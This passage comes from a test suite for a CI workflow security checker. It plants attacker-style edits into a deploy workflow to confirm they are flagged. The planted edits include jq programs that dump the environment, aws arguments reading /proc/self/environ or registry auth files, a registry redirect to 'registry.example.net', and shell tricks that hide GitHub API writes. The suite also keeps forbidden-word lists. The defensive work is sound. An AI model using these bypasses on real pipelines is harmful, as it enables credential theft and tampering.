      ['lzma', ['xz', '--format=lzma']],
    ] as const) {
      const path = join(scratch, `image-${name}.tar`)
      writeFileSync(path, execFileSync(compress[0], [...compress.slice(1), '-c', plain]))
      const temp = mkdtempSync(join(scratch, 'runner-'))
      execFileSync('mkdir', [join(temp, 'image')])
      cpSync(path, join(temp, 'image', 'image.tar'))
      const result = spawnSync('bash', ['-c', `${IMAGE_UNPACK_RUN}\n`], {
        encoding: 'utf8',
        env: { PATH: `${stand}:${process.env.PATH ?? ''}`, HOME: temp, RUNNER_TEMP: temp },
      })
      expect(result.status, name).toBe(1)
      expect(spoken(result.stdout).at(-1), name).toBe("image-check: the image's archive can't be read")
      expect(existsSync(ran), name).toBe(false)
      expect(existsSync(join(temp, 'image-layout')), name).toBe(false)
    }
  })

  it('refuses an unpacked folder that holds a link even with no listing first', () => {
    const named = layout()
    rmSync(join(named, 'index.json'))
    symlinkSync('/etc/hostname', join(named, 'index.json'))
    const alone = `set -euo pipefail\n${IMAGE_CHECK}\nunpack_image "$RUNNER_TEMP/image/image.tar" "${IMAGE_LAYOUT}"\n`
    expect(checked(archive(named), alone)).toMatchObject({ status: 1, said: FOLDER })
    const extra = layout()
    writeFileSync(join(extra, 'manifest.json'), '[]')
    expect(checked(archive(extra, ['manifest.json']), alone)).toMatchObject({ status: 1, said: FOLDER })
  })
})

describe('DPW-11 (C11-D48): every checkout leaves no credential behind', () => {
  it('finds each planted breakage', () => {
    expect(checkoutFindings(plant('          persist-credentials: false\n', '', job('synth')))).toEqual([
      `${DEPLOY}: DPW-11 synth (Check out the release's commit): actions/checkout has persist-credentials: false`,
    ])
    expect(checkoutFindings(plant('          persist-credentials: false\n', '', '', CI))).toEqual([
      `${CI}: DPW-11 audit (step 1): actions/checkout has persist-credentials: false`,
    ])
    // GUARDS-03: the action quoted, or named in another letter case, which GitHub resolves alike; and
    // YAML-A4-01 (the eighth review's fourth attack): a backslash for a slash, an empty segment, quoted or
    // not, which GitHub's runner reads as actions/checkout too.
    const step = '      - uses: actions/checkout@v5\n        with:\n          persist-credentials: false\n'
    for (const uses of [
      '"actions/checkout@v5"',
      "'actions/checkout@v5'",
      'Actions/Checkout@v5',
      'actions\\checkout@v5',
      "'actions\\checkout@v5'",
      'actions//checkout@v5',
      '/actions/checkout@v5',
      'actions/checkout/@v5',
    ]) {
      expect(
        checkoutFindings(plant(step, `      - uses: ${uses}\n        with:\n          fetch-depth: 1\n`, '', CI)),
        uses,
      ).toEqual([`${CI}: DPW-11 audit (step 1): actions/checkout has persist-credentials: false`])
    }
  })

  it('holds the repository', () => {
    expect(checkoutFindings(workflows)).toEqual([])
  })
})

describe('DPW-12 (C11-D63, C11-D64): words no workflow needs', () => {
  it('finds each word planted once, in deploy.yml (a comment included) and the general ones in ci.yml outside a comment', () => {
    for (const word of DEPLOY_WORDS) {
      expect(forbiddenWordFindings(plant('name: deploy\n', `# ${word}\nname: deploy\n`))).toEqual([
        `${DEPLOY}: DPW-12 names ${word}`,
      ])
    }
    expect(
      forbiddenWordFindings(
        addedBefore(
          'nonprod',
          'Read back what runs',
          "          SERVICE_LIST='[]'\n",
          '          echo get-secret-value\n',
        ),
      ),
    ).toEqual([`${DEPLOY}: DPW-12 names get-secret-value`])
    // In deploy.yml a word inside a longer one counts too.
    expect(
      forbiddenWordFindings(plant('name: deploy\n', '# apps/server/scripts/check-owner-bootstrap.ts\nname: deploy\n')),
    ).toEqual([`${DEPLOY}: DPW-12 names owner-bootstrap`])
    expect(forbiddenWordFindings(plant('name: deploy\n', '# x-get-secret-value\nname: deploy\n'))).toEqual([
      `${DEPLOY}: DPW-12 names get-secret-value`,
    ])
    for (const word of GENERAL_WORDS) {
      expect(
        forbiddenWordFindings(
          plant(
            '      - run: npm audit signatures\n',
            `      - run: npm audit signatures\n      - run: echo ${word}\n`,
            '',
            CI,
          ),
        ),
      ).toEqual([`${CI}: DPW-12 names ${word}`])
      expect(forbiddenWordFindings(plant('jobs:\n', `# ${word}\njobs:\n`, '', CI))).toEqual([])
      // Round 4: a line starting with # inside a run is bash's, and inside a quoted string no comment at all,
      // so only a YAML comment is stripped.
      expect(
        forbiddenWordFindings(
          plant(
            '      - run: npm audit signatures\n',
            `      - run: npm audit signatures\n      - run: |\n          x="\n          # ${word}\n          "\n          eval "\${x//#/}"\n`,
            '',
            CI,
          ),
        ),
        word,
      ).toEqual([`${CI}: DPW-12 names ${word}`])
    }
  })

  it('holds the repository', () => {
    expect(forbiddenWordFindings(workflows)).toEqual([])
  })
})

describe('DPW-13 (C11-D44, C11-D50, C11-D51, C11-D61, C11-D79; T24 item 10): what is built, pushed, synthesised and recorded', () => {
  const at = (where: string, rule: string) => `${DEPLOY}: DPW-13 ${where}: ${rule}`
  const PUSH =
    'pushes only as SKOPEO_COPY: --preserve-digests, --digestfile and the tag sha-$COMMIT-$GITHUB_RUN_ID-$GITHUB_RUN_ATTEMPT'
  const ONLY_PUSH = 'pushes only in the deploy-mode push step of nonprod and prod: no rollback, drill or restore pushes'
  const TAG = 'names an image by no tag but the push’s own'
  const SYNTH =
    'synthesises only as npm run synth -w @hearth/infra -- -c release="$COMMIT:$DIGEST", by mode -c drill=break:nonprod or -c restoreActive=true, and -o'
  const BODY = 'builds each record’s body whole by jq -n, with ref main, auto_merge false and no required contexts'
  const find = (from: string, to: string, after = '') => releaseFindings(plant(from, to, after))
  const push = '      - name: Push the image\n'

  it('finds each planted breakage', () => {
    expect(
      find(
        `npm run synth -w @hearth/infra -- -c release="$COMMIT:$DIGEST" "\${CONTEXT[@]}"`,
        'npm run synth:ci -w @hearth/infra --',
      ),
    ).toEqual([
      at('synth (Synthesise the release)', PINNED_13),
      at(
        'deploy.yml',
        "synthesises only with the pipeline's npm run synth, never synth:ci, synth:lz, HEARTH_FAKE_RELEASE or cdk synth",
      ),
      at('synth (Synthesise the release)', SYNTH),
    ])
    expect(find('          CONTEXT=()\n', '          CONTEXT=()\n          export HEARTH_FAKE_RELEASE=1\n')).toEqual([
      at('synth (Synthesise the release)', PINNED_13),
      at(
        'deploy.yml',
        "synthesises only with the pipeline's npm run synth, never synth:ci, synth:lz, HEARTH_FAKE_RELEASE or cdk synth",
      ),
    ])
    expect(find('          CONTEXT=()\n', '          CONTEXT=(-c release=x)\n')).toEqual([
      at('synth (Synthesise the release)', PINNED_13),
      at('synth (Synthesise the release)', SYNTH),
    ])
    expect(find(':sha-$COMMIT-$GITHUB_RUN_ID-$GITHUB_RUN_ATTEMPT"', ':latest"', push)).toEqual([
      at('nonprod (Push the image)', PINNED_13),
      at('deploy.yml', 'names no image :latest'),
      at('nonprod (Push the image)', TAG),
      at('nonprod (Push the image)', PUSH),
    ])
    expect(find(':sha-$COMMIT-$GITHUB_RUN_ID-$GITHUB_RUN_ATTEMPT"', ':sha-$COMMIT-$GITHUB_RUN_ID"', push)).toEqual([
      at('nonprod (Push the image)', PINNED_13),
      at('nonprod (Push the image)', TAG),
      at('nonprod (Push the image)', PUSH),
    ])
    expect(
      find(
        "needs.gate.outputs.build == 'true' }}",
        "(needs.gate.outputs.build == 'true' || needs.gate.outputs.mode == 'rollback') }}",
        job('build'),
      ),
    ).toEqual([at('build', 'runs only when the gate says so: a deploy, not a restore')])
    expect(
      releaseFindings(
        addedBefore(
          'nonprod',
          'Read back what runs',
          "          SERVICE_LIST='[]'\n",
          '          gh api -X POST "repos/$REPO/deployments" --input - <<<"$BODY"\n',
        ),
      ),
    ).toEqual([
      at(
        'nonprod (Read back what runs)',
        'writes no record: release records are record-nonprod’s and record-prod’s, migration records migrate’s',
      ),
      at('nonprod (Read back what runs)', BODY),
    ])
    // A record written by a deploy job in any spelling gh takes: the method after the path, with =, or
    // left to gh, which posts whenever there is a body.
    const record = (line: string) =>
      releaseFindings(
        addedBefore('nonprod', 'Read back what runs', "          SERVICE_LIST='[]'\n", `          ${line}\n`),
      )
    const NO_RECORD = [
      at(
        'nonprod (Read back what runs)',
        'writes no record: release records are record-nonprod’s and record-prod’s, migration records migrate’s',
      ),
      at('nonprod (Read back what runs)', BODY),
    ]
    expect(record('ID=$(gh api "repos/$REPO/deployments" --method POST --input - <<<"$B")')).toEqual(NO_RECORD)
    expect(record('gh api --method=POST "repos/$REPO/deployments" --input - <<<"$B"')).toEqual(NO_RECORD)
    expect(record('gh api -XPOST "repos/$REPO/deployments" --input - <<<"$B"')).toEqual(NO_RECORD)
    expect(record('gh api "repos/$REPO/deployments" --input - <<<"$B"')).toEqual(NO_RECORD)
    expect(record('gh api \\\n            "repos/$REPO/deployments" --input - <<<"$B"')).toEqual(NO_RECORD)
    expect(record('gh api -X DELETE "repos/$REPO/deployments/$ID"')).toEqual([
      at('nonprod (Read back what runs)', 'sends a record’s body whole, with --input -'),
      ...NO_RECORD,
    ])
    // migrate's step writes its one migration record and that record's status, nothing beside them.
    const ended = '          one_off_end migrate "$MIGRATE_LINES" "$RUN"\n'
    expect(
      find(
        ended,
        `${ended}          ID=$(gh api -X POST "repos/$REPO/deployments" --input - --jq .id <<<"$BODY")\n`,
        job('nonprod'),
      ),
    ).toEqual([
      at('nonprod (Migrate)', PINNED_13),
      at('nonprod (Migrate)', 'writes in its migrate step the one migration record and its status alone'),
    ])
    // Any other write, GraphQL's included, is no record's.
    expect(record("gh api graphql -f query='mutation { x }'")).toEqual([
      at('nonprod (Read back what runs)', 'makes no GitHub API write but a record’s'),
      at('nonprod (Read back what runs)', 'sends a record’s body whole, with --input -'),
    ])
    expect(find('auto_merge: false, ', '', job('record-nonprod'))).toEqual([
      at('record-nonprod (Write the record)', PINNED_13),
      at('record-nonprod (Write the record)', BODY),
      at('record-nonprod (Write the record)', RECORD_LINES),
    ])
    expect(
      find(
        'id=$(gh api -X POST "repos/$REPO/deployments" --input - --jq .id <<<"$body")',
        'id=$(gh api -X POST "repos/$REPO/deployments" -f ref=main -f payload="$2" --jq .id)',
        job('record-nonprod'),
      ),
    ).toEqual([
      at('record-nonprod (Write the record)', PINNED_13),
      at('record-nonprod (Write the record)', HELD),
      at('record-nonprod (Write the record)', 'sends a record’s body whole, with --input -'),
      at('record-nonprod (Write the record)', RECORD_LINES),
    ])
    const end = '          one_off_end migrate "$MIGRATE_LINES" "$RUN"\n'
    const last = `          echo "migrate: recorded $COMMIT as the commit nonprod's database was migrated by" | mask | tee -a "$GITHUB_STEP_SUMMARY"\n`
    expect(
      releaseFindings(
        withText(DEPLOY, edited(edited(deployText, end, '', job('nonprod')), last, `${last}${end}`, job('nonprod'))),
      ),
    ).toEqual([
      at('nonprod (Migrate)', PINNED_13),
      at(
        'nonprod (Migrate)',
        'writes the migration record only after migrate’s own end, which fails on any exit but 0',
      ),
    ])
    expect(
      releaseFindings(
        addedBefore(
          'rollback-nonprod',
          'Roll back Tasks and Services',
          `          ${CDK_FOLDER}\n`,
          `          ${SKOPEO_COPY}\n`,
        ),
      ),
    ).toEqual([at('rollback-nonprod (Roll back Tasks and Services)', ONLY_PUSH)])
    expect(
      find(
        `if: \${{ needs.gate.outputs.mode == 'deploy' && needs.gate.outputs.target == 'prod' }}\n        env:\n          ACCOUNT_ID`,
        `if: \${{ (needs.gate.outputs.mode == 'deploy' && needs.gate.outputs.target == 'prod') || needs.gate.outputs.target == 'restore' }}\n        env:\n          ACCOUNT_ID`,
        job('prod'),
      ),
    ).toEqual([at('prod (Push the image)', PINNED_13), at('prod (Push the image)', ONLY_PUSH)])
  }, 30_000)

  // A record job holds deployments: write, so it runs no repository code: one step, no action, and only
  // bash's own, its functions, jq and gh api.
  it('finds an image archive pushed unchecked: the check dropped, moved past the credentials or skipped, or the push from the archive (SECURITY-01, round 5)', () => {
    const IMAGE =
      'checks and unpacks the image archive it downloaded (IMAGE_CHECK) after the download and before the credentials action, under the push’s if:'
    const step = 'Check and unpack the image'
    for (const id of ['nonprod', 'prod']) {
      expect(releaseFindings(removedStep(id, step)), id).toEqual([at(`${id} (${step})`, PINNED_13), at(id, IMAGE)])
      expect(releaseFindings(movedStep(id, step, 'What runs')), id).toEqual([at(id, IMAGE)])
      expect(releaseFindings(movedStep(id, step, 'Download the image')), id).toEqual([at(id, IMAGE)])
    }
    expect(
      releaseFindings(
        plant(
          `if: \${{ needs.gate.outputs.mode == 'deploy' }}\n        run: |\n          set -euo pipefail\n          # The runner reads`,
          `if: \${{ needs.gate.outputs.mode != 'rollback' }}\n        run: |\n          set -euo pipefail\n          # The runner reads`,
          job('nonprod'),
        ),
      ),
    ).toEqual([at(`nonprod (${step})`, PINNED_13), at('nonprod', IMAGE)])
    // The push handed the archive again, which skopeo would unpack itself.
    expect(
      find('"oci:$RUNNER_TEMP/image-layout:build"', '"oci-archive:$RUNNER_TEMP/image/image.tar:build"', push),
    ).toEqual([
      at('nonprod (Push the image)', PINNED_13),
      at('deploy.yml', 'hands skopeo no archive, which it would unpack itself: the push copies from an OCI layout'),
      at('nonprod (Push the image)', TAG),
      at('nonprod (Push the image)', PUSH),
    ])
    // The build's check of the archive buildx wrote, dropped.
    expect(find('          check_image_archive "$RUNNER_TEMP/image.tar"\n', '', job('build'))).toEqual([
      at('build (Build the image)', PINNED_13),
    ])
  })

  it('finds a check and unpacking skipped where the step runs before the credentials (DPW-06), and IMAGE_CHECK’s tools on any other line (DPW-10)', () => {
    const imageIf = `if: \${{ needs.gate.outputs.mode == 'deploy' }}\n        run: |\n          set -euo pipefail\n          # The runner reads`
    expect(deployStepFindings(plant(imageIf, imageIf.replace("== 'deploy'", "!= 'rollback'"), job('nonprod')))).toEqual(
      [
        `${DEPLOY}: DPW-06 nonprod: runs every step up to its credentials action, and AWS_CHECK after it, unconditionally, but its downloads, a download’s asset check under that download’s if:, and its image check, under the push’s if:`,
      ],
    )
    const tar = '          tar --extract --file - --directory "$2" --no-same-owner --no-same-permissions <"$1"\n'
    const found = credentialedCodeFindings(
      addedBefore('nonprod', 'Read back what runs', "          SERVICE_LIST='[]'\n", tar),
      manifests,
      lockfile,
    )
    expect(found).toContain(
      `${DEPLOY}: DPW-10 nonprod (Read back what runs): runs nothing but bash’s own, its functions, gh api, git merge-base, jq, the text tools, aws, skopeo, the pinned CLI, CLI_FETCH’s fetch, IMAGE_CHECK’s listing and unpacking and the preamble’s stop token, and names no npm, npx, node, shell, source, eval, docker, python, make, curl or wget but that fetch, or script: no tool is handed a program to run`,
    )
  })

  it('finds a checkout or a program in a record job', () => {
    const RECORD = 'runs one step, with no action, of only bash’s own, its functions, jq and gh api: no repository code'
    const write = '      - name: Write the record\n'
    const checkout = [
      '      - name: Check out',
      `        uses: ${pinOf('actions/checkout')}`,
      '        with:',
      '          persist-credentials: false',
      '      - name: Run code',
      '        run: node scripts/x.ts',
      '',
    ].join('\n')
    expect(find(write, `${checkout}${write}`, job('record-nonprod'))).toEqual([
      at('record-nonprod (Run code)', UNPINNED),
      at('record-nonprod', RECORD),
    ])
    expect(
      releaseFindings(
        addedBefore('record-prod', 'Write the record', '          record() {\n', '          node scripts/x.ts\n'),
      ),
    ).toEqual([
      at('record-prod (Write the record)', PINNED_13),
      at('record-prod', RECORD),
      at('record-prod (Write the record)', HELD),
    ])
    expect(
      releaseFindings(
        addedBefore('record-prod', 'Write the record', '          record() {\n', '          ./scripts/x.sh\n'),
      ),
    ).toEqual([
      at('record-prod (Write the record)', PINNED_13),
      at('record-prod', RECORD),
      at('record-prod (Write the record)', HELD),
    ])
    // GUARDS-01: an escaped blank before # once hid what follows it from the reader; the table names no
    // unquoted backslash, and refuses it at its line (9, where the plant stands in the run).
    expect(
      releaseFindings(
        addedBefore('record-nonprod', 'Write the record', '          record() {\n', '          echo a\\ #;node x\n'),
      ),
    ).toEqual([
      at('record-nonprod (Write the record)', PINNED_13),
      at('record-nonprod', RECORD),
      at('record-nonprod (Write the record), line 9', AS_BASH),
    ])
  })

  // Round 2's GUARDS-01 and GUARDS-02: a record job's write hidden after a substitution's ), inside a ${…}
  // or in backticks is read or refused.
  it('finds a record write that a substitution’s ), a parameter expansion or backticks would hide', () => {
    const WHOLE = 'sends a record’s body whole, with --input -'
    const post = 'gh api -X POST "repos/$REPO/deployments" -f ref=main -f task=hearth-release -f environment=nonprod'
    const record = (line: string) =>
      releaseFindings(
        addedBefore('record-nonprod', 'Write the record', '          record() {\n', `          ${line}\n`),
      )
    const refused = at('record-nonprod (Write the record), line 9', AS_BASH)
    const pinned = at('record-nonprod (Write the record)', PINNED_13)
    expect(record(post)).toEqual([
      pinned,
      at('record-nonprod (Write the record)', HELD),
      at('record-nonprod (Write the record)', WHOLE),
      at('record-nonprod (Write the record)', RECORD_LINES),
    ])
    expect(record(`echo $(echo)#;${post}`)).toEqual([pinned, refused, at('record-nonprod (Write the record)', WHOLE)])
    expect(record(`echo \${x:-a #}; ${post}`)).toEqual([
      pinned,
      refused,
      at('record-nonprod (Write the record)', WHOLE),
    ])
    expect(record(`echo \`${post}\``)).toEqual([pinned, refused, at('record-nonprod (Write the record)', WHOLE)])
  })

  // Round 3's SECURITY-01, SECURITY-02 and GUARDS-05 in a record job, which holds deployments: write: a
  // quoted record write run by $[ … ], ${x@P}, a canonical line off its text, an offset or a compound
  // assignment's subscript, or by local given a flag or a name it builds, is refused; and so is a write
  // after an assignment that holds a substitution, which the reader now reads.
  it(`finds a record write that $[ ], \${x@P}, an offset, a subscript, a canonical line or local would run unseen`, () => {
    const RECORD = 'runs one step, with no action, of only bash’s own, its functions, jq and gh api: no repository code'
    const WHOLE = 'sends a record’s body whole, with --input -'
    const post =
      'gh api -X POST "repos/$REPO/deployments" -f ref=main -f task=hearth-release -f environment=nonprod --silent'
    const quoted = `'GITHUB_RUN_ATTEMPT[$(${post}; echo 0)]'`
    const pinned = at('record-nonprod (Write the record)', PINNED_13)
    const record = (...lines: string[]) =>
      releaseFindings(
        addedBefore(
          'record-nonprod',
          'Write the record',
          '          record() {\n',
          `          ${lines.join('\n          ')}\n`,
        ),
      )
    for (const lines of [
      [`x=${quoted}`, 'echo "$[x]" >/dev/null'],
      [`manifests=${quoted}`, 'manifests=$((manifests + 1))'],
      [`x='$(${post})'`, `echo "\${x@P}" >/dev/null`],
      [`y=${quoted}`, 'a=([y]=1)'],
      [`x=${quoted}`, 'local "$x=1"'],
    ]) {
      expect(record(...lines), lines.join('; ')).toEqual([
        pinned,
        at('record-nonprod (Write the record), line 10', AS_BASH),
        at('record-nonprod (Write the record)', RECORD_LINES),
      ])
    }
    expect(record(`y=${quoted}`, `: "\${@:y}"`)).toEqual([
      pinned,
      at('record-nonprod', RECORD),
      at('record-nonprod (Write the record), line 10', AS_BASH),
      at('record-nonprod (Write the record)', RECORD_LINES),
    ])
    const refused = at('record-nonprod (Write the record), line 9', AS_BASH)
    expect(record('local -n r=x')).toEqual([pinned, at('record-nonprod', RECORD), refused])
    expect(record('local -i n')).toEqual([pinned, at('record-nonprod', RECORD), refused])
    expect(record(`X=$(true) ${post}`)).toEqual([
      pinned,
      at('record-nonprod', RECORD),
      refused,
      at('record-nonprod (Write the record)', WHOLE),
    ])
  })

  // Round 4 in a record job: a form SHELL_TABLE doesn't name is refused at its line (9, where the plant
  // stands), and each command is held to the flags and arguments the workflow uses (GLUE_USES).
  it('refuses a form SHELL_TABLE doesn’t name and holds each command, in a record job', () => {
    const where = 'record-nonprod (Write the record)'
    const record = (line: string) =>
      releaseFindings(
        addedBefore('record-nonprod', 'Write the record', '          record() {\n', `          ${line}\n`),
      )
    for (const line of [
      `echo "\${x/a/b}"`,
      'echo "$(<x)"',
      'cat 0<&3',
      'echo "\\$x"',
      'while true; do break; done',
      'echo a |& cat',
      'echo a%b',
      'IFS=x',
      'eval "$x"',
      'set +e',
      'f() { :; }',
      'echo a > "$RUNNER_TEMP/x"',
    ]) {
      expect(record(line), line).toContain(at(`${where}, line 9`, AS_BASH))
    }
    for (const line of [
      'X=1 jq -n .',
      'jq -f x',
      "jq -n --rawfile a x '.'",
      "jq -n 'input_filename'",
      "jq -n '$__prog_args'",
      'gh api repos/x/y',
      'gh api -X DELETE "repos/$REPO/deployments/1"',
      'gh api -H x "repos/$REPO/deployments"',
      'tee x',
    ]) {
      expect(record(line), line).toContain(at(where, HELD))
    }
  })

  it('holds the repository', () => {
    expect(releaseFindings(workflows)).toEqual([])
  })
})

// Round 4's first attack on the allowlist: each way past it the attackers proved, planted as they planted
// it, is found at its root: a jq or gh program built from a quoted string and an expansion, the registry
// password asked for on a line of its own, a record, a function of a canonical text or an aws value
// given what the workflow never gives it, an input a pinned line reads set by a line of its own, an env:
// value or a whole env: mapping from elsewhere, and a step the gates, the smokes, the rollbacks or the
// records rest on ending early or writing an output of its own.
describe('Round 4, attack 1: the ways past the allowlist (DPW-07 to DPW-10, DPW-13)', () => {
  const at = (rule: string, where: string, text: string) => `${DEPLOY}: ${rule} ${where}: ${text}`
  const SETS_INPUT =
    "sets no variable its step's or its job's env: sets or a canonical text in its run sets, no name an aws value reads or the read-back builds one from but by the commands AWS_VALUE_LINES writes (the read-back's from AWS's answers, never a stack's outputs), REGISTRY and RUN only on their own lines and ACCOUNT_ID on none, so no line the guard holds is handed another input"
  const ENV =
    'sets only the environment variables the workflow uses, each to the value STEP_ENVS names (a job, STAGE alone): no BASH_ENV, PATH or NODE_OPTIONS, and no input from another step, job or context'
  const MAPPING =
    'writes env:, with: and outputs: as block mappings, never one expression GitHub would read as the whole mapping'
  const LOGIN = 'asks ECR for the registry password only as SKOPEO_LOGIN, piped straight into skopeo login'
  const credentialed = (planted: ReadonlyMap<string, string>) => credentialedCodeFindings(planted, manifests, lockfile)
  const mark = 'Services are about to change'
  const services = '          echo "services_started=true" >>"$GITHUB_OUTPUT"\n'
  const pushed = '          PUSHED=$(cat "$RUNNER_TEMP/pushed")\n'
  const migrated = '          MIGRATED=$(gh api "repos/$REPO/deployments'
  const smoke = '          if [ "$SMOKE" = success ] && [ "$MODE" != drill-smoke ]; then\n'
  const lines = (...each: string[]) => each.map(line => `          ${line}\n`).join('')

  // EXPAND-A1-01 and COMMANDS-A1-02: a program word that joins a quoted string to an expansion hands jq (or
  // gh's --jq) a program built at run time, `.|env` or `$ENV|@base64`, which the hold never read.
  it('holds a jq or gh program to one whole single-quoted string (EXPAND-A1-01, COMMANDS-A1-02)', () => {
    const held = at('DPW-10', `nonprod (${mark})`, HELD)
    for (const program of [`'.'"$P"`, `''"$P"`, `'.|'"$P"`, `''"$P$GITHUB_WORKSPACE"'"}; $p'`]) {
      expect(
        credentialed(
          addedBefore('nonprod', mark, services, lines("A='|e'", "B='nv'", 'P="$A$B"', `jq -nc ${program}`)),
        ),
        program,
      ).toContain(held)
    }
    expect(
      releaseFindings(
        addedBefore(
          'record-nonprod',
          'Write the record',
          migrated,
          lines(
            "P='$E''NV|tostring|@base64'",
            `gh api "repos/$REPO/deployments?environment=$ENVIRONMENT&task=hearth-migrated&per_page=1" --jq '.|'"$P"`,
          ),
        ),
      ),
    ).toContain(at('DPW-13', 'record-nonprod (Write the record)', HELD))
    // The workflow's own programs, each one whole string, still pass.
    expect(credentialed(withText(DEPLOY, deployText))).toEqual([])
  }, 30_000)

  // COMMANDS-A1-01: the registry password, a credential good for twelve hours, asked for on a line of its
  // own goes to the log through the filter, which hides only twelve-digit runs.
  it('asks ECR for the registry password only as the login (COMMANDS-A1-01)', () => {
    for (const line of [
      'run aws ecr get-login-password --region ap-southeast-1',
      'X=$(get aws ecr get-login-password --region ap-southeast-1)',
      'get aws ecr get-login-password --region ap-southeast-1',
      'get aws ecr get-login-password --region ap-southeast-1 | tee -a "$GITHUB_STEP_SUMMARY"',
      'get aws ecr get-login-password --region ap-southeast-1 | mask',
    ]) {
      const planted = addedBefore('nonprod', 'Push the image', pushed, lines(line))
      expect(maskingFindings(planted), line).toContain(at('DPW-07', 'nonprod (Push the image)', LOGIN))
      expect(credentialed(planted), line).toContain(at('DPW-10', 'nonprod (Push the image)', HELD))
    }
  }, 30_000)

  // COMMANDS-A1-03: a record job writes only its own release records (and record-prod its restore records),
  // from the payload release_payload built, in its own environment.
  it('holds a record job to the records it writes, and their environment (COMMANDS-A1-03)', () => {
    const where = 'record-nonprod (Write the record)'
    for (const line of [
      `record hearth-migrated '{"schema": 1, "commit": "${'0'.repeat(40)}"}'`,
      'record hearth-"restore" "$PAYLOAD"',
      'record hearth-restore "$PAYLOAD"',
      `PAYLOAD=$(release_payload deploy ${'0'.repeat(40)} "$DIGEST" "$SERVICES")`,
    ]) {
      const found = releaseFindings(addedBefore('record-nonprod', 'Write the record', smoke, lines(line)))
      expect(found, line).toContain(at('DPW-13', where, HELD))
      expect(found, line).toContain(at('DPW-13', where, PINNED_13))
    }
    expect(
      releaseFindings(addedBefore('record-nonprod', 'Write the record', smoke, lines('ENVIRONMENT=prod'))),
    ).toContain(at('DPW-13', where, SETS_INPUT))
    // The record job's env: is held too: its ENVIRONMENT is its own.
    expect(
      credentialed(plant('          ENVIRONMENT: nonprod\n', '          ENVIRONMENT: prod\n', job('record-nonprod'))),
    ).toEqual([at('DPW-10', where, ENV)])
  }, 30_000)

  // COMMANDS-A1-04: a canonical text's function called again by a line of its own, or handed another
  // pattern by a variable set anew, prints the log lines it withholds.
  it('holds a call of a canonical function to the call the workflow makes (COMMANDS-A1-04)', () => {
    const record = '          # The migration record (C11-D58;'
    expect(credentialed(addedBefore('nonprod', 'Migrate', record, lines(`one_off_end migrate '.' "$RUN"`)))).toContain(
      at('DPW-10', 'nonprod (Migrate)', HELD),
    )
    expect(
      credentialed(
        addedBefore('nonprod', 'Migrate', '          one_off_end migrate "$MIGRATE_LINES"', lines("MIGRATE_LINES='.'")),
      ),
    ).toContain(at('DPW-10', 'nonprod (Migrate)', SETS_INPUT))
    expect(credentialed(addedBefore('nonprod', 'Migrate', record, lines("RUN='{}'")))).toContain(
      at('DPW-10', 'nonprod (Migrate)', SETS_INPUT),
    )
    expect(
      releaseFindings(addedBefore('nonprod', 'Migrate', record, lines(`one_off_end migrate '.' "$RUN"`))),
    ).toContain(at('DPW-13', 'nonprod (Migrate)', PINNED_13))
  }, 30_000)

  // COMMANDS-A1-05 and FLOW-A1-05: aws reads a file a value names by a scheme or a shorthand load anywhere in
  // it, quoted or not, and an option a quoted word spells; a value starting with an expansion holds what an
  // own line put there.
  it('holds each aws value as aws reads it (COMMANDS-A1-05, FLOW-A1-05)', () => {
    const readBack = "          SERVICE_LIST='[]'\n"
    const call = (value: string) =>
      `X=$(get aws ecs describe-services --cluster ${value} --services "hearth-$STAGE-api" --query 'services[0]' --output json)`
    for (const value of [
      `'file'://"$RUNNER_TEMP/x"`,
      `'file':///'pr'oc/self/environ`,
      '"$X"',
      `"x" '--debug'`,
      `"x" '--endpoint-url' x`,
      'fileb://x',
      '"https://x"',
    ]) {
      expect(
        credentialed(addedBefore('nonprod', 'Read back what runs', readBack, lines(call(value)))),
        value,
      ).toContain(at('DPW-10', 'nonprod (Read back what runs)', HELD))
    }
    const shorthand =
      'IDS=$(get aws ecr describe-images --repository-name hearth-server --image-ids "imageDigest=$DIGEST,imageTag@=file://$XDG_RUNTIME_DIR/containers/auth.json" --query \'imageDetails[0].imageTags\' --output json)'
    expect(credentialed(addedBefore('nonprod', 'Push the image', pushed, lines(shorthand)))).toContain(
      at('DPW-10', 'nonprod (Push the image)', HELD),
    )
  }, 30_000)

  // COMMANDS-A1-06 and FLOW-A1-03: the login sends the password, and the copy the image, wherever REGISTRY
  // names; the tag's commit is COMMIT's, which the push's env: names.
  it('pins the push: its registry, its env and its run (COMMANDS-A1-06, FLOW-A1-03)', () => {
    const planted = addedBefore('nonprod', 'Push the image', pushed, lines('REGISTRY="registry.example.net"'))
    expect(credentialed(planted)).toContain(at('DPW-10', 'nonprod (Push the image)', SETS_INPUT))
    expect(releaseFindings(planted)).toContain(at('DPW-13', 'nonprod (Push the image)', PINNED_13))
    expect(credentialed(addedBefore('nonprod', 'Push the image', pushed, lines(`COMMIT=${'1'.repeat(40)}`)))).toContain(
      at('DPW-10', 'nonprod (Push the image)', SETS_INPUT),
    )
    const commit = `          COMMIT: \${{ steps.release.outputs.commit }}\n          DIGEST: \${{ steps.release.outputs.digest }}\n`
    // An output no step writes is read as '', which the binding rule finds too (round 12).
    for (const [to, bound] of [
      ['needs.gate.outputs.previous_nonprod_commit', true],
      ['steps.release.outputs.comit', false],
    ] as const) {
      expect(
        credentialed(
          plant(commit, commit.replace('steps.release.outputs.commit', to), '      - name: Push the image\n'),
        ),
        to,
      ).toEqual([
        at('DPW-10', 'nonprod (Push the image)', ENV),
        ...(bound ? [] : [at('DPW-10', 'nonprod (Push the image)', BINDING)]),
      ])
    }
    // The release step that names the commit is pinned whole too.
    expect(
      releaseFindings(
        addedBefore('nonprod', 'The release this job deploys', '          {\n', lines(`COMMIT=${'1'.repeat(40)}`)),
      ),
    ).toContain(at('DPW-13', 'nonprod (The release this job deploys)', PINNED_13))
  }, 30_000)

  // FLOW-A1-01 and FLOW-A1-02: a pinned run reads its inputs from its step's env:, which is pinned whole, so a
  // TARGET from prod-gate's outputs (which hold none) or another commit's SHA can't skip its checks.
  it('pins every env: value (FLOW-A1-01, FLOW-A1-02)', () => {
    const target = `          TARGET: \${{ needs.gate.outputs.target }}\n          RECORD_ID: \${{ needs.prod-gate`
    // prod-gate outputs neither, which the binding rule finds too (round 12).
    expect(
      credentialed(plant(target, target.replace('needs.gate.outputs.target', 'needs.prod-gate.outputs.target'))),
    ).toEqual([at('DPW-10', 'prod (The fast re-check)', ENV), at('DPW-10', 'prod (The fast re-check)', BINDING)])
    const mode = `          MODE: \${{ needs.gate.outputs.mode }}\n          TARGET: \${{ needs.gate.outputs.target }}\n          RECORD_ID`
    expect(credentialed(plant(mode, mode.replace('needs.gate.outputs.mode', 'needs.prod-gate.outputs.mode')))).toEqual([
